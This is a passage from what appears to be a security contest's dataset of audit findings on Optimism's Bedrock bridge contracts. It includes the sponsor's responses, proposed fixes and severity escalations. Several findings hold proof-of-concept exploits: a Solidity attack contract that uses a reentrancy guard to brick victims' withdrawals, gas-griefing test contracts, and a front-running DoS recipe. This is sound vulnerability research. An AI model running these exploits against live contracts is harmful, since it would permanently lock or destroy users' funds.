implying a high likelihood that this will affect a majority of our withdrawal transactions. Great find.ч"For any withdrawal where a user sets their gas limit within 5122 of the actual gas their execution requires, a malicious user can call `finalizeWithdrawalTransaction()` on their behalf with enough gas to pass the check, but not enough for execution to succeed.\nThe result is that the withdrawing user will have their funds permanently locked in the `OptimismPortal` contract.\nProof of Concept\nTo test this behavior in a sandboxed environment, you can copy the following proof of concept.\nHere are three simple contracts that replicate the behavior of the Portal, as well as an external contract that uses a predefined amount of gas.\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nlibrary SafeCall {\n    /**\n     * @notice Perform a low level call without copying any returndata\n     *\n     * @param _target   Address to call\n     * @param _gas      Amount of gas to pass to the call\n     * @param _value    Amount of value to pass to the call\n     * @param _calldata Calldata to pass to the call\n     */\n    function call(\n        address _target,\n        uint256 _gas,\n        uint256 _value,\n        bytes memory _calldata\n    ) internal returns (bool) {\n        bool _success;\n        assembly {\n            _success := call(\n                _gas, // gas\n                _target, // recipient\n                _value, // ether value\n                add(_calldata, 0x20), // inloc\n                mload(_calldata), // inlen\n                0, // outloc\n                0 // outlen\n            )\n        }\n        return _success;\n    }\n}\n\ncontract GasUser {\n    uint[] public s;\n\n    function store(uint i) public {\n        for (uint j = 0; j < i; j++) {\n            s.push(1);\n        }\n    }\n}\n\ncontract Portal {\n    address l2Sender;\n\n    struct Transaction {\n        uint gasLimit;\n        address sender;\n        address target;\n        uint value;\n        bytes data;\n    }\n\n    constructor(address _l2Sender) {\n        l2Sender = _l2Sender;\n    }\n\n    function execute(Transaction memory _tx) public {\n        require(\n            gasleft() >= _tx.gasLimit + 20000,\n            ""OptimismPortal: insufficient gas to finalize withdrawal""\n        );\n\n        // Set the l2Sender so contracts know who triggered this withdrawal on L2.\n        l2Sender = _tx.sender;\n\n        // Trigger the call to the target contract. We use SafeCall because we don't\n        // care about the returndata and we don't want target contracts to be able to force this\n        // call to run out of gas via a returndata bomb.\n        bool success = SafeCall.call(\n            _tx.target,\n            gasleft() - 20000,\n            _tx.value,\n            _tx.data\n        );\n    }\n}\n```\n\nHere is a Foundry test that calls the Portal with various gas values to expose this vulnerability:\nSummarizing the results of this test:\nWe verify that the call to the target contract succeeds with 44,602 gas, and set that as gasLimit for all tests.\nWhen we send 65,681 or less gas, it’s little enough to be caught by the require statement.\nWhen we send 70,803 or more gas, the transaction will succeed.\nWhen we send any amount of gas between these two values, the require check is passed but the transaction fails.\nCode Snippet\nTool used\nManual Review"
Causing users lose their fund during finalizing withdrawal transactionчhighч```\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n\nstruct WithdrawalTransaction {\n   uint256 nonce;\n   address sender;\n   address target;\n   uint256 value;\n   uint256 gasLimit;\n   bytes data;\n}\n\ninterface IOptimismPortal {\n   function finalizeWithdrawalTransaction(WithdrawalTransaction memory _tx)\n       external;\n}\n\ncontract AttackContract {\n   bool public donotRevert;\n   bytes metaData;\n   address optimismPortalAddress;\n\n   constructor(address _optimismPortal) {\n       optimismPortalAddress = _optimismPortal;\n   }\n\n   function enableRevert() public {\n       donotRevert = true;\n   }\n\n   function setMetaData(WithdrawalTransaction memory _tx) public {\n       metaData = abi.encodeWithSelector(\n           IOptimismPortal.finalizeWithdrawalTransaction.selector,\n           _tx\n       );\n   }\n\n   function attack() public {\n       if (!donotRevert) {\n           revert();\n       } else {\n           optimismPortalAddress.call(metaData);\n       }\n   }\n}\n```\nчA malicious user can make users lose their fund during finalizing their withdrawal. This is possible due to presence of reentrancy guard on the function `relayMessage`.\nBob (a malicious user) creates a contract (called AttackContract) on L1.\n```\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n\nstruct WithdrawalTransaction {\n   uint256 nonce;\n   address sender;\n   address target;\n   uint256 value;\n   uint256 gasLimit;\n   bytes data;\n}\n\ninterface IOptimismPortal {\n   function finalizeWithdrawalTransaction(WithdrawalTransaction memory _tx)\n       external;\n}\n\ncontract AttackContract {\n   bool public donotRevert;\n   bytes metaData;\n   address optimismPortalAddress;\n\n   constructor(address _optimismPortal) {\n       optimismPortalAddress = _optimismPortal;\n   }\n\n   function enableRevert() public {\n       donotRevert = true;\n   }\n\n   function setMetaData(WithdrawalTransaction memory _tx) public {\n       metaData = abi.encodeWithSelector(\n           IOptimismPortal.finalizeWithdrawalTransaction.selector,\n           _tx\n       );\n   }\n\n   function attack() public {\n       if (!donotRevert) {\n           revert();\n       } else {\n           optimismPortalAddress.call(metaData);\n       }\n   }\n}\n```\n\n```\n        if (!donotRevert) {\n            revert();\n        }\n```\n\nThen, Bob calls the function `enableRevert` to set `donotRevert` to `true`. So that if later the function `attack()` is called again, it will not revert.\n```\n    function enableRevert() public {\n        donotRevert = true;\n    }\n```\n\nThen, Bob notices that Alice is withdrawing large amount of fund from L2 to L1. Her withdrawal transaction is proved but she is waiting for the challenge period to be finished to finalize it.\nThen, Bob calls the function `setMetaData` on the contract `AttackContract` with the following parameter:\n`_tx` = Alice's withdrawal transaction\nBy doing so, the `metaData` will be equal to `finalizeWithdrawalTransaction.selector` + Alice's withdrawal transaction.\n```\n   function setMetaData(WithdrawalTransaction memory _tx) public {\n        metaData = abi.encodeWithSelector(\n            IOptimismPortal.finalizeWithdrawalTransaction.selector,\n            _tx\n        );\n    }\n```\n\nNow, after the challenge period is passed, and before the function `finalizeWithdrawalTransaction` is called by anyone (Alice), Bob calls the function `relayMessage` with the required data to retry his previous failed message again.\nThis time, since `donotRevert` is `true`, the call to function `attack()` will not revert, instead the body of `else clause` will be executed.\n```\n        else {\n            optimismPortalAddress.call(metaData);\n        }\n```\n\nIn summary the attack is as follows:\nBob creates a malicious contract on L1 called `AttackContract`.\nBob sends a message from L2 to L1 to call the function `AttackContract.attack` on L1.\nOn L1 side, after the challenge period is passed, the function `AttackContract.attack` will be called.\nMessage relay on L1 will be unsuccessful, because the function `AttackContract.attack` reverts. So, Bob's message will be flagged as failed message.\nBob sets `AttackContract.donotRevert` to true.\nBob waits for an innocent user to request withdrawal transaction.\nBob waits for the innocent user's withdrawal transaction to be proved.\nBob sets meta data in his malicious contract based on the innocent user's withdrawal transaction.\nBob waits for the challenge period to be passed.\nAfter the challenge period is elapsed, Bob retries to relay his failed message again.\n`CrossDomainMessenger.relayMessage` will call the `AttackContract.attack`, then it calls `OptimismPortal.finalizeWithdrawalTransaction` to finalize innocent user's withdrawal transaction. Then, it calls `CrossDomainMessenger.relayMessage`, but it will be unsuccessful because of reentrancy guard.\nAfter finalizing the innocent user's withdrawal transaction, Bob's message will be flagged as successful.\nSo, innocent user's withdrawal transaction is flagged as finalized, while it is not.ч"```\n        try IL1CrossDomainMessanger.relayMessage(// rest of code) {} catch Error(string memory reason) {\n            if (\n                keccak256(abi.encodePacked(reason)) ==\n                keccak256(abi.encodePacked(""ReentrancyGuard: reentrant call""))\n            ) {\n                revert(""finalizing should be reverted"");\n            }\n        }\n```\n\nDiscussion\nrcstanciu\nComment from Optimism\n\nDescription: Causing users lose their fund during finalizing withdrawal transaction\nReason: This is a very creative exploit that takes advantage of the L1CrossDomainMessenger's reentrancy guard on `relayMessage`. By creating an attack contract that reverts the first time a message is relayed by the `OptimismPortal` to the `L1CrossDomainMessenger`, but can be toggled to call `finalizeWithdrawalTransaction` for a different withdrawal transaction when the attacker replays it via the `L1CrossDomainMessenger`, the attacker can force the honest withdrawal's call to the `L1CrossDomainMessenger` to revert, effectively bricking it. PoC: here\nAction: If a withdrawal transaction fails, we should check to see if the `_target` of the `WithdrawalTransaction` is the `L1CrossDomainMessenger`. If so, check if the call's revert data is the reentrancy guard message. If it is, we should revert the `finalizeWithdrawalTransaction` message and NOT mark the withdrawal as finalized."чBy doing this attack it is possible to prevent users from withdrawing their fund. Moreover, they lose their fund because withdrawal is flagged as finalized, but the withdrawal sent to `L1CrossDomainMessanger` was not successful.\nCode Snippet\nTool used\nManual Review
Censorship resistance is undermined and bridging of assets can be DOSed at low costчmediumч"```\n// Make sure we can actually buy the resource amount requested by the user.\nparams.prevBoughtGas += _amount;\nrequire(\n    int256(uint256(params.prevBoughtGas)) <= MAX_RESOURCE_LIMIT,\n    ""ResourceMetering: cannot buy more gas than available gas limit""\n);\n```\n"ч"All L1->L2 transactions go through OptimismPortal's `depositTransaction` function. It is wrapped through the `metered` modifier. The goal is to create a gas market for L1->L2 transactions and not allow L1 TXs to fill up L2 batches (as the gas for deposit TX in L2 is payed for by the system), but the mechanism used makes it too inexpensive for a malicious user to DOS and censor deposits.\nIt is possible for a malicious actor to snipe arbitrary L1->L2 transactions in the mempool for far too cheaply. This introduces two impacts:\nUndermines censorship resistance guarantees by Optimism\nGriefs users who simply want to bridge assets to L2\n```\n// Make sure we can actually buy the resource amount requested by the user.\nparams.prevBoughtGas += _amount;\nrequire(\n    int256(uint256(params.prevBoughtGas)) <= MAX_RESOURCE_LIMIT,\n    ""ResourceMetering: cannot buy more gas than available gas limit""\n);\n```\n\nNote that `params.prevBoughtGas` is reset per block. This means attacker can view a TX in the mempool and wrap up the following flashbot bundle:\nAttacker TX to `depositTransaction`, with gasLimit = 8M (MAX_RESOURCE_LIMIT)\nVictim TX to `depositTransaction`\nThe result is that attacker's transaction will execute and victim's TX would revert. It is unknown how this affects the UI and whether victim would be able to resubmit this TX again easily, but regardless it's clearly griefing user's attempt to bridge an asset. Note that a reverted TX is different from an uncompleted TX from a UX point of view.\nFrom a censorship resistance perspective, there is nothing inherently preventing attack to continually use this technique to block out all TXs, albert gas metering price will rise as will be discussed.\nNow we can demonstrate the cost of the attack to be low. Gas burned by the modifier is calculated as:\n```\n// Determine the amount of ETH to be paid.\nuint256 resourceCost = _amount * params.prevBaseFee;\n// rest of code\nuint256 gasCost = resourceCost / Math.max(block.basefee, 1000000000);\n```\n\n`params.prevBaseFee` is initialized at 1e9 and goes up per block by a factor of 1.375 when gas market is drained, while going down by 0.875 when gas market wasn't used at all.\nIf we take the initial value, `resourceCost` = 8e6 * 1e9 = 8e15. If we assume tip is negligible to `block.basefee`, L1 gas cost in ETH equals `resourceCost` (divide by basefee and multiply by basefee). Therefore, cost of this snipe TX is:\n`8e15 / 1e18 (ETH decimals) * 1600 (curr ETH price) = $12.80`\nThe result is an extremely low price to pay, and even taking into account extra tips for frontrunning, is easily achievable.\nIn practice `prevBaseFee` will represent the market price for L2 gas. If it goes lower than initial value, DOSing will become cheaper, while if it goes higher it will become more expensive. The key problem is that the attacker's cost is too similar to the victim's cost. If victim is trying to pass a 400k TX, attacker needs to buy a 7.6M of gas. This gap is too small and the resulting situation is that for DOS to be too expensive for attacker, TX would have to be far too expensive for the average user."чIt is admittedly difficult to balance the need for censorship resistance with the prevention of L2 flooding via L1 TXs. However, the current solution which will make a victim's TX revert at hacker's will is inadequate and will lead to severe UX issues for users.\nDiscussion\nrcstanciu\nComment from Optimism\n\nDescription: Deposit griefing by front running and filling up the MAX_RESOURCE_LIMIT\nReason: DOSчCensorship resistance is undermined and bridging of assets can be DOSed at low cost.\nCode Snippet\nTool used\nManual Review
[High] Function MigrateWithdrawal() may set gas limit so high for old withdrawals when migrating them by mistake and they can't be relayed in the L1 and users funds would be lostчmediumч"```\n// MigrateWithdrawal will turn a LegacyWithdrawal into a bedrock\n// style Withdrawal.\nfunc MigrateWithdrawal(withdrawal *LegacyWithdrawal, l1CrossDomainMessenger *common.Address) (*Withdrawal, error) {\n // Attempt to parse the value\n value, err := withdrawal.Value()\n if err != nil {\n  return nil, fmt.Errorf(""cannot migrate withdrawal: %w"", err)\n }\n\n abi, err := bindings.L1CrossDomainMessengerMetaData.GetAbi()\n if err != nil {\n  return nil, err\n }\n\n // Migrated withdrawals are specified as version 0. Both the\n // L2ToL1MessagePasser and the CrossDomainMessenger use the same\n // versioning scheme. Both should be set to version 0\n versionedNonce := EncodeVersionedNonce(withdrawal.Nonce, new(big.Int))\n // Encode the call to `relayMessage` on the `CrossDomainMessenger`.\n // The minGasLimit can safely be 0 here.\n data, err := abi.Pack(\n  ""relayMessage"",\n  versionedNonce,\n  withdrawal.Sender,\n  withdrawal.Target,\n  value,\n  new(big.Int),\n  withdrawal.Data,\n )\n if err != nil {\n  return nil, fmt.Errorf(""cannot abi encode relayMessage: %w"", err)\n }\n\n // Set the outer gas limit. This cannot be zero\n gasLimit := uint64(len(data)*16 + 200_000)\n\n w := NewWithdrawal(\n  versionedNonce,\n  &predeploys.L2CrossDomainMessengerAddr,\n  l1CrossDomainMessenger,\n  value,\n  new(big.Int).SetUint64(gasLimit),\n  data,\n )\n return w, nil\n}\n```\n"ч"Function `MigrateWithdrawal()` in migrate.go will turn a LegacyWithdrawal into a bedrock style Withdrawal. it should set a min gas limit value for the withdrawals. to calculate a gas limit contract overestimates it and if the value goes higher than L1 maximum gas in the block then the withdraw can't be relayed in the L1 and users funds would be lost while the withdraw could be possible before the migration it won't be possible after it.\nThis is `MigrateWithdrawal()` code:\n```\n// MigrateWithdrawal will turn a LegacyWithdrawal into a bedrock\n// style Withdrawal.\nfunc MigrateWithdrawal(withdrawal *LegacyWithdrawal, l1CrossDomainMessenger *common.Address) (*Withdrawal, error) {\n // Attempt to parse the value\n value, err := withdrawal.Value()\n if err != nil {\n  return nil, fmt.Errorf(""cannot migrate withdrawal: %w"", err)\n }\n\n abi, err := bindings.L1CrossDomainMessengerMetaData.GetAbi()\n if err != nil {\n  return nil, err\n }\n\n // Migrated withdrawals are specified as version 0. Both the\n // L2ToL1MessagePasser and the CrossDomainMessenger use the same\n // versioning scheme. Both should be set to version 0\n versionedNonce := EncodeVersionedNonce(withdrawal.Nonce, new(big.Int))\n // Encode the call to `relayMessage` on the `CrossDomainMessenger`.\n // The minGasLimit can safely be 0 here.\n data, err := abi.Pack(\n  ""relayMessage"",\n  versionedNonce,\n  withdrawal.Sender,\n  withdrawal.Target,\n  value,\n  new(big.Int),\n  withdrawal.Data,\n )\n if err != nil {\n  return nil, fmt.Errorf(""cannot abi encode relayMessage: %w"", err)\n }\n\n // Set the outer gas limit. This cannot be zero\n gasLimit := uint64(len(data)*16 + 200_000)\n\n w := NewWithdrawal(\n  versionedNonce,\n  &predeploys.L2CrossDomainMessengerAddr,\n  l1CrossDomainMessenger,\n  value,\n  new(big.Int).SetUint64(gasLimit),\n  data,\n )\n return w, nil\n}\n```\n\nAs you can see it sets the gas limit as `gasLimit := uint64(len(data)*16 + 200_000)` and contract set 16 gas per data byte but in Ethereum when data byte is 0 then the overhead intrinsic gas is 4 and contract overestimate the gas limit by setting 16 gas for each data. this can cause messages with big data(which calculated gas is higher than 30M) to not be relay able in the L1 because if transaction gas set lower than calculated gas then OptimisimPortal would reject it and if gas set higher than calculated gas then miners would reject the transaction. while if code correctly estimated the required gas the gas limit could be lower by the factor of 4. for example a message with about 2M zeros would get gas limit higher than 30M and it won't be withdrawable in the L1 while the real gas limit is 8M which is relayable."чcalculate gas estimation correctly, 4 for 0 bytes and 16 for none zero bytes.\nDiscussion\nrcstanciu\nComment from Optimism\n\nDescription: Incorrect gas limit calculation for migrated withdrawals\nReason: This is a legitimate issue.\nAction: Implement correct gas estimation\n0xunforgiven\nEscalate for 111 USDC\nThis should labeled as High because some of old legit withdrawals(L2 -> L1) won't be executed in the L1 after the bedrock migration. Those withdrawals belongs to L2CrossDomainMessages which promised to be delivered in L1.\nUsers may lose funds and there is no limit for it. there may be users who wants to withdraw 1M funds with L2StandardBridge and because of this issue their funds would be lost even so the L2StandardBridge is supposed to deliver the funds! The withdrawals with large amount of data isn't that rare, There may be other protocols or users in L2 which uses the bridge to store data in the L1 and send withdrawals with large data to the L2CrossDomainMessenger and because of the issue their withdrawal message won't be finalized in L1 after migration.\nIt is true that this would only happen to some of the withdrawal messages but as we have other gas related issues that blocks withdrawal of limited number of withdrawals(#96 which is only happen to withdrawals that would revert if gas was 5K lower and #109 which happened to withdrawals with higher than ~1M gas) and they considered as High so to be fair This issue should be High too.\nThis is direct fund loss if it happens to user ETH bridges and also cause L2CrossDomainMessenger's messages to not finalized and be replayable in L1 if it happens to it's withdrawal messages.\nsherlock-admin\nEscalate for 111 USDC\nThis should labeled as High because some of old legit withdrawals(L2 -> L1) won't be executed in the L1 after the bedrock migration. Those withdrawals belongs to L2CrossDomainMessages which promised to be delivered in L1.\nUsers may lose funds and there is no limit for it. there may be users who wants to withdraw 1M funds with L2StandardBridge and because of this issue their funds would be lost even so the L2StandardBridge is supposed to deliver the funds! The withdrawals with large amount of data isn't that rare, There may be other protocols or users in L2 which uses the bridge to store data in the L1 and send withdrawals with large data to the L2CrossDomainMessenger and because of the issue their withdrawal message won't be finalized in L1 after migration.\nIt is true that this would only happen to some of the withdrawal messages but as we have other gas related issues that blocks withdrawal of limited number of withdrawals(#96 which is only happen to withdrawals that would revert if gas was 5K lower and #109 which happened to withdrawals with higher than ~1M gas) and they considered as High so to be fair This issue should be High too.\nThis is direct fund loss if it happens to user ETH bridges and also cause L2CrossDomainMessenger's messages to not finalized and be replayable in L1 if it happens to it's withdrawal messages.\nYou've created a valid escalation for 111 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation rejected as there is insufficient evidence for high severity.\nsherlock-admin\nEscalation rejected as there is insufficient evidence for high severity.\nThis issue's escalations have been rejected!\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.чsome withdraw messages from L2 to L1 that could be relayed before the migration can't be relayed after the migration because of the wrong gas estimation.\nCode Snippet\nhttps://github.com/ethereum-optimism/optimism/blob/3f4b3c328153a8aa03611158b6984d624b17c1d9/op-chain-ops/crossdomain/migrate.go#L83-L88\nTool used\nManual Review
Migration can be bricked by sending a message directly to the LegacyMessagePasserчmediumч```\nif addr == dump.MessagePasserAddress {\n    statedumper.WriteMessage(caller.Address(), input)\n}\n```\nч"The migration process halts and returns an error if any of the withdrawal data breaks from the specified format. However, the data for this migration comes from every call that has been made to the LegacyMessagePasser (0x00) address, and it is possible to send a transaction that would violate the requirements. The result is that the migration process would be bricked and need to be rebuilt, with some difficult technical challenges that we'll outline below.\nWithdrawal data is saved in l2geth whenever a call is made to the LegacyMessagePasser address:\n```\nif addr == dump.MessagePasserAddress {\n    statedumper.WriteMessage(caller.Address(), input)\n}\n```\n\nThis will save all the calls that came via the L2CrossDomainMessenger. The expected format for the data is encoded in the L2CrossDomainMessenger. It encodes the calldata to be executed on the L1 side as: `abi.encodeWithSignature(""relayMessage(...)"", target, sender, message, nonce)`\nThe migration process expects the calldata to follow this format, and expects the call to come from L2CrossDomainMessenger, implemented with the following two checks:\n```\nselector := crypto.Keccak256([]byte(""relayMessage(address,address,bytes,uint256)""))[0:4]\nif !bytes.Equal(data[0:4], selector) {\n    return fmt.Errorf(""invalid selector: 0x%x"", data[0:4])\n}\n\nmsgSender := data[len(data)-len(predeploys.L2CrossDomainMessengerAddr):]\nif !bytes.Equal(msgSender, predeploys.L2CrossDomainMessengerAddr.Bytes()) {\n    return errors.New(""invalid msg.sender"")\n}\n```\n\nThe migration process will be exited and the migration will fail if this assumption is violated.\nHowever, since the function on the LegacyMessagePasser is public, it can also be called directly with arbitrary calldata:\n```\nfunction passMessageToL1(bytes memory _message) external {\n    sentMessages[keccak256(abi.encodePacked(_message, msg.sender))] = true;\n}\n```\n\nThis allows us to submit calldata that would violate both of these checks and cause the migration to panic and fail.\nWhile it may seem easy to filter these withdrawals out and rerun the migration, this solution would not work either. That's because, later in the process, we check that easy storage slot in the LegacyMessagePasser contract has a corresponding withdrawal in the migration:\n```\nfor slot := range slotsAct {\n    _, ok := slotsInp[slot]\n    if !ok {\n        return nil, fmt.Errorf(""unknown storage slot in state: %s"", slot)\n    }\n}\n```\n\nThe result is that the Optimism team would need to unwind the migration, develop a new migration process to account for this issue, and remigrate with an untested system."ч
Withdrawals with high gas limits can be bricked by a malicious user, permanently locking fundsчhighч"```\nrequire(\n    gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,\n    ""OptimismPortal: insufficient gas to finalize withdrawal""\n);\n```\n"ч"Transactions to execute a withdrawal from the Optimism Portal require the caller to send enough gas to cover `gasLimit` specified by the withdrawer.\nBecause the EVM limits the total gas forwarded on to 63/64ths of the total `gasleft()` (and silently reduces it to this value if we try to send more) there are situations where transactions with high gas limits will be vulnerable to being reverted.\nBecause there are no replays on this contract, the result is that a malicious user can call `finalizeWithdrawalTransaction()` with a precise amount of gas, cause the withdrawer’s withdrawal to fail, and permanently lock their funds.\nWithdrawals can be withdrawn from L2's `L2ToL1MessagePasser` contract to L1's `OptimismPortal` contract. This is a less ""user-friendly"" withdrawal path, presumably for users who know what they are doing.\nOne of the quirks of the `OptimismPortal` is that there is no replaying of transactions. If a transaction fails, it will simply fail, and all ETH associated with it will remain in the `OptimismPortal` contract. Users have been warned of this and understand the risks, so Optimism takes no responsibility for user error.\nIn order to ensure that failed transactions can only happen at the fault of the user, the contract implements a check to ensure that the gasLimit is sufficient:\n```\nrequire(\n    gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,\n    ""OptimismPortal: insufficient gas to finalize withdrawal""\n);\n```\n\nWhen the transaction is executed, the contract requests to send along all the remaining gas, minus the hardcoded `FINALIZE_GAS_BUFFER` for actions after the call. The goal is that this will ensure that the amount of gas forwarded on is at least the gas limit specified by the user.\nOptimism is aware of the importance of this property being correct when they write in the comments:\n“We want to maintain the property that the amount of gas supplied to the call to the target contract is at least the gas limit specified by the user. We can do this by enforcing that, at this point in time, we still have gaslimit + buffer gas available.”\nThe issue is that the EVM specifies the maximum gas that can be sent to an external call as 63/64ths of the `gasleft()`. For very large gas limits, this 1/64th that remains could be greater than the hardcoded FINALIZE_GAS_BUFFER value. In this case, less gas would be forwarded along than was directed by the contract.\nHere is a quick overview of the math:\nWe need X gas to be sent as a part of the call.\nThis means we need `X * 64 / 63` gas to be available at the time the function is called.\nHowever, the only check is that we have `X + 20_000` gas a few operations prior to the call (which guarantees that we have `X + 14878` at the time of the call).\nFor any situation where `X / 64 > 14878` (in other words, when the amount of gas sent is greater than 952_192), the caller is able to send an amount of gas that passes the check, but doesn't forward the required amount on in the call."ч"Change the check to account for this 63/64 rule:\n```\nrequire(\n    gasleft() >= (_tx.gasLimit + FINALIZE_GAS_BUFFER) * 64 / 63,\n    ""OptimismPortal: insufficient gas to finalize withdrawal""\n);\n```\n\nDiscussion\nrcstanciu\nComment from Optimism\n\nDescription: Withdrawals with high gas limits can be bricked by a malicious user, permanently locking funds\nReason: The issue is that we do not account for the 63/64ths rule specified in EIP-150 when checking the remaining gas available for executing a withdrawal transaction. This means that a malicious user can permissionlessly brick a withdrawal that has a minimum gas limit > 952,192 by forcing the `OptimismPortal` to forward an incorrect amount of gas, causing the withdrawal transaction to fail unexpectedly.\nAction: In order to fix this issue, we need to factor in the 63/64 rule specified in EIP-150 when checking the remaining gas available for executing a withdrawal transaction on L313 of the `OptimismPortal` contract. See Zach's suggestion. (VERY IMPORTANT NOTE: This issue exists independently of #109.)"ч"For any withdrawal with a gas limit of at least 952,192, a malicious user can call `finalizeWithdrawalTransaction()` with an amount of gas that will pass the checks, but will end up forwarding along less gas than was specified by the user.\nThe result is that the withdrawing user can have their funds permanently locked in the `OptimismPortal` contract.\nProof of Concept\nTo test this behavior in a sandboxed environment, you can copy the following proof of concept.\nHere are three simple contracts that replicate the behavior of the Portal, as well as an external contract that uses a predefined amount of gas.\n(Note that we added 5122 to the gas included in the call to correct for the other bug we submitted, as this issue remains even when the other bug is patched.)\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nlibrary SafeCall {\n    /**\n     * @notice Perform a low level call without copying any returndata\n     *\n     * @param _target   Address to call\n     * @param _gas      Amount of gas to pass to the call\n     * @param _value    Amount of value to pass to the call\n     * @param _calldata Calldata to pass to the call\n     */\n    function call(\n        address _target,\n        uint256 _gas,\n        uint256 _value,\n        bytes memory _calldata\n    ) internal returns (bool) {\n        bool _success;\n        assembly {\n            _success := call(\n                _gas, // gas\n                _target, // recipient\n                _value, // ether value\n                add(_calldata, 0x20), // inloc\n                mload(_calldata), // inlen\n                0, // outloc\n                0 // outlen\n            )\n        }\n        return _success;\n    }\n}\n\ncontract GasUser {\n    uint[] public s;\n\n    function store(uint i) public {\n        for (uint j = 0; j < i; j++) {\n            s.push(1);\n        }\n    }\n}\n\ncontract Portal {\n    address l2Sender;\n\n    struct Transaction {\n        uint gasLimit;\n        address sender;\n        address target;\n        uint value;\n        bytes data;\n    }\n\n    constructor(address _l2Sender) {\n        l2Sender = _l2Sender;\n    }\n\n    function execute(Transaction memory _tx) public {\n        require(\n            gasleft() >= _tx.gasLimit + 20000,\n            ""OptimismPortal: insufficient gas to finalize withdrawal""\n        );\n\n        // Set the l2Sender so contracts know who triggered this withdrawal on L2.\n        l2Sender = _tx.sender;\n\n        // Trigger the call to the target contract. We use SafeCall because we don't\n        // care about the returndata and we don't want target contracts to be able to force this\n        // call to run out of gas via a returndata bomb.\n        bool success = SafeCall.call(\n            _tx.target,\n            gasleft() - 20000 + 5122, // fix for other bug\n            _tx.value,\n            _tx.data\n        );\n    }\n}\n```\n\nHere is a Foundry test that calls the Portal with various gas values to expose this vulnerability:\nAs you can see:\nWe verify that the call to the target contract succeeds with 11,245,655 gas, and set that as gasLimit for all tests. This is the `X` from our formula above.\nThis means that we need `11_245_655 * 64 / 63 = 11_424_157` gas available at the time the call is made.\nThe test uses `9023` gas before it makes our call, so we can see that if we send `11_424_157 + 9_023 = 11_433_180` gas, the test passes.\nSimilarly, if we send `11_266_734` gas, the total gas will be small enough to fail the require check.\nBut in the sweet spot between these values, we have enough gas to pass the require check, but when we get to the call, the amount of gas requested is more than 63/64ths of the total, so the EVM sends less than we asked for. As a result, the transaction fails.\nCode Snippet\nTool used\nManual Review"
Challenger can override the 7 day finalization periodчmediumч```\nl2Outputs.push(\n            Types.OutputProposal({\n                outputRoot: _outputRoot,\n                timestamp: uint128(block.timestamp),\n                l2BlockNumber: uint128(_l2BlockNumber)\n            })\n        );\n```\nч"All withdrawals are finalized after a 7 days window (finalization period). After this duration transaction are confirmed and user can surely withdraw their balance. But due to lack of check, challenger can delete a l2Output which is older than 7 days meaning withdrawals will stop working for even confirmed transaction\nProposer has proposed L2 output for a _l2BlockNumber which creates entries on l2Outputs using the proposeL2Output. Assume this creates a new l2Output at index X\n```\nl2Outputs.push(\n            Types.OutputProposal({\n                outputRoot: _outputRoot,\n                timestamp: uint128(block.timestamp),\n                l2BlockNumber: uint128(_l2BlockNumber)\n            })\n        );\n```\n\nproveWithdrawalTransaction has been called for user linked to this l2Output\nFinalization period(7 day) is over after proposal and Users is ready to call `finalizeWithdrawalTransaction` to withdraw their funds\nSince confirmation is done, User A is sure that he will be able to withdraw and thinks to do it after coming back from his holidays\nChallenger tries to delete the index X (Step 1), ideally it should not be allowed as already confirmed. But since there is no such timeline check so the l2Output gets deleted\n```\nfunction deleteL2Outputs(uint256 _l2OutputIndex) external {\n        require(\n            msg.sender == CHALLENGER,\n            ""L2OutputOracle: only the challenger address can delete outputs""\n        );\n\n        // Make sure we're not *increasing* the length of the array.\n        require(\n            _l2OutputIndex < l2Outputs.length,\n            ""L2OutputOracle: cannot delete outputs after the latest output index""\n        );\n\n        uint256 prevNextL2OutputIndex = nextOutputIndex();\n\n        // Use assembly to delete the array elements because Solidity doesn't allow it.\n        assembly {\n            sstore(l2Outputs.slot, _l2OutputIndex)\n        }\n\n        emit OutputsDeleted(prevNextL2OutputIndex, _l2OutputIndex);\n    }\n```\n\nUser comes back and now tries to withdraw but the withdraw fails since the l2Output index X does not exist anymore. This is incorrect and nullifies the network guarantee.\nNote: In case of a separate output root could be proven then user withdrawal will permanently stuck. Ideally if such anomaly could not be caught within finalization period then user should be allowed to withdraw"ч"Add below check in\n```\nrequire(getL2Output(_l2OutputIndex).timestamp<=FINALIZATION_PERIOD_SECONDS, ""Output already confirmed"");\n```\n\nDiscussion\nrcstanciu\nComment from Optimism\n\nDescription: deleteL2Outputs delays finalization\nReason: This is know and expected behavior. If it did not delay finalization, new outputs would not be subject to the finalization window\ncsanuragjain\nEscalate for 30 USDC\nFinalization period is the time for raising any dispute and if finalization period is crossed then no matter what, transaction should be considered confirmed (Refer https://github.com/ethereum-optimism/optimism/blob/develop/specs/withdrawals.md).\nThe issue here is that Challenger is able to bypass the 7 days finalization period. Post 7 day finalization period, transaction should come in confirmed state but seems like Challenger can delete the l2OutputRoot even for confirmed state transaction. This is incorrect and will bring confirmed transaction into unconfirmed state again even when they completed the finalization period.\nChallenger should be disallowed to delete any L2Output where `getL2Output(_l2OutputIndex).timestamp>FINALIZATION_PERIOD_SECONDS`\nsherlock-admin\nEscalate for 30 USDC\nFinalization period is the time for raising any dispute and if finalization period is crossed then no matter what, transaction should be considered confirmed (Refer https://github.com/ethereum-optimism/optimism/blob/develop/specs/withdrawals.md).\nThe issue here is that Challenger is able to bypass the 7 days finalization period. Post 7 day finalization period, transaction should come in confirmed state but seems like Challenger can delete the l2OutputRoot even for confirmed state transaction. This is incorrect and will bring confirmed transaction into unconfirmed state again even when they completed the finalization period.\nChallenger should be disallowed to delete any L2Output where `getL2Output(_l2OutputIndex).timestamp>FINALIZATION_PERIOD_SECONDS`\nYou've created a valid escalation for 30 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation accepted.\nAccepting escalation and labeling issue as medium as challenger is able to delete finalized withdrawals.\nsherlock-admin\nEscalation accepted.\nAccepting escalation and labeling issue as medium as challenger is able to delete finalized withdrawals.\nThis 